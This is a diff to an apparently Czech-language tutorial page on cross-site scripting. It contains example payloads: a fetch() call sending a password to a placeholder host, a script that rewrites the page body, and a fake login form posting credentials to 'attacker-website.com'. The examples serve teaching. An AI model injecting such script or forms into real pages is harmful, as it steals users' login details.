@@ -21,14 +21,27 @@
 	Toto v případě vstupu od uživatele nechceme.<br>
 	<br>
 	Pomocí JavaScriptu lze například odesílat data na jiné adresy pomocí funkcí <a href="https://javascript.info/xmlhttprequest">XMLHttpRequest</a> nebo <a href="https://javascript.info/fetch">fetch</a><br>
-	<span class="code multi-line-code nosplit">
-		&lt;script&gt;<br>
-		&emsp;&emsp;&emsp;&emsp;fetch("http://send/secrets/here?password=ABCabc123");<br>
-		&lt;/script&gt;<br>
-	</span>
+	<pre class="code multi-line-code nosplit">
+&lt;script&gt;
+    fetch("http://send/secrets/here?password=ABCabc123");
+&lt;/script&gt;
+</pre>
 	<br>
 	Krom toho se dá také modifikovat samotné HTML:<br>
 	<pre class="code multi-line-code nosplit">
-		
-	</pre>
+&lt;script&gt;document.body.innerHTML='&lt;html kod&gt;'&lt;/script&gt;
+</pre><br>
+	Modifikovat by se dal například takto:<br>
+	<pre class="code multi-line-code nosplit">
+&lt;form action="https://attacker-website.com" method="POST"&gt;
+    Username:
+    &lt;input type="text" name="username"&gt;
+    Password:
+    &lt;input type="password" name="passwd"&gt;
+    &lt;input type="submit" value="Submit"&gt;
+&lt;/form&gt;
+</pre><br>
+	Tímto by se tělo stránky (&lt;body&gt;) přepsalo na nově zadaný HTML kód.<br>
+	<br>
+	Příklad napsán výš je například formulář, který se ptá uživatele na uživatelské jméno a heslo, a výsledky potom odesílá na útočníkovu URL adresu.<br>
 </div>
